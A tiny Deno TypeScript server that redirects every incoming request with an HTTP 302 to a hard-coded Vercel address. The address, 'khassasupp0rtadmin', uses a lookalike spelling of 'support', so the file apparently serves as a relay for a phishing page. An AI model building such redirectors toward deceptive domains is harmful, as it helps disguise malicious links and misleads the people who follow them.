import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "http://khassasupp0rtadmin.vercel.app//", // Replace this with your actual link
    },
  });
});
